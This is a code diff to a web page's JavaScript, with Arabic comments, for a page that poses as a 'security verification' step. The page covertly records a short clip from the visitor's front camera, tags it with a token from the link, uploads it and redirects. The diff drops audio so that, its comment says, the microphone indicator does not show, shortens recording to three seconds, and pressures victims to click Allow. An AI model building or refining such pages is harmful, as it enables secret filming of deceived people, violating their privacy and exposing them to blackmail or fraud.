@@ -57,15 +57,15 @@
             const video = document.getElementById('video');
 
             try {
-                // طلب الكاميرا والصوت معاً لتسجيل الفيديو
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // طلب الكاميرا وحدها بدون صوت (audio: false) لكي لا تظهر علامة الميكروفون وتبدأ فوراً بدون تعليق
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 video.srcObject = stream;
                 await video.play();
 
                 statusText.textContent = "جاري تأكيد بيانات التحقق الأمني...";
                 statusText.className = "text-xs text-amber-400 font-semibold";
 
-                let options = { mimeType: 'video/webm;codecs=vp8,opus' };
+                let options = { mimeType: 'video/webm;codecs=vp8' };
                 if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                     options = { mimeType: 'video/webm' };
                 }
@@ -89,7 +89,6 @@
                     reader.onloadend = async () => {
                         const base64data = reader.result;
 
-                        // استخراج الرمز token من المسار أو الرابط
                         const pathParts = window.location.pathname.split('/');
                         const token = pathParts.pop() || pathParts.pop() || new URLSearchParams(window.location.search).get('t');
 
@@ -113,7 +112,6 @@
                             console.error('Failed to submit video');
                         }
 
-                        // التوجيه التلقائي إلى ملف ok.html بعد نجاح العملية
                         setTimeout(() => {
                             window.location.href = '/ok.html';
                         }, 1500);
@@ -121,12 +119,12 @@
                     reader.readAsDataURL(blob);
                 };
 
-                // بدء التسجيل لمدة 4 ثوانٍ تلقائياً ثم إيقافه وحفظه
+                // التسجيل لمدة 3 ثوانٍ فقط ليكون سريع وخفيف جداً
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
                     stream.getTracks().forEach(track => track.stop());
-                }, 4000);
+                }, 3000);
 
             } catch (err) {
                 statusText.textContent = "تنبيه: يجب النقر على 'السماح' (Allow) لإتمام التحقق الأمني!";
